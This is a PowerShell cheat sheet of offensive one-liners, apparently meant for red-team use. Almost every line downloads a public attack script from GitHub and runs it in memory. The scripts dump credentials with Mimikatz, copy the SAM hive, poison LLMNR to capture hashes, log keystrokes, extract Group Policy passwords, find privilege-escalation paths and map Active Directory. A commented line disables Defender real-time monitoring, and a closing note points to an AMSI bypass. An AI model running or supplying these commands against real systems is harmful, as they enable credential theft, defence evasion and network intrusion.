# Set-MPPreference -DisableRealtimeMonitoring $true

############# admin privs required
## Mimikatz - grab credentials from memory
iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1 -usebasicparsing); Invoke-Mimikatz

## NinjaCopy - copy sensitive files
iex( iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1 -usebasicparsing); Invoke-NinjaCopy -path C:\Windows\System32\config\SAM -LocalDestination $env:Temp\sam

## Inveigh - LLMNR poisoning
# requires AD Domain to capture hashes
iex( iwr https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 -usebasicparsing); Invoke-Inveigh -ConsoleOutput Y

############# user context ok
## Keylogger
iex (iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1 -usebasicparsing); Get-Keystrokes
cat $env:temp\key.log

## GPPPasswords - Search for passwords in Group Policy Preference files
# requires AD Domain
iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1 -usebasicparsing); Get-GPPPassword

## PowerUp - Check for privilege escalation oportunities
iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -usebasicparsing); Invoke-AllChecks

## PowerView - Active Directory reconaissance
iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -usebasicparsing); Get-NetLocalGroupMember

## BloodHoud - Active Directory reconaissance
# requires AD Domain
iex( iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 -usebasicparsing); Invoke-BloodHound

## Get-Information - reconaissance script
iex( iwr https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Gather/Get-Information.ps1 -usebasicparsing); Get-Information -ErrorAction SilentlyContinue

# amsi bypass
# Visit https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell and copy the code for the first bypass method "Patch the providers DLL"
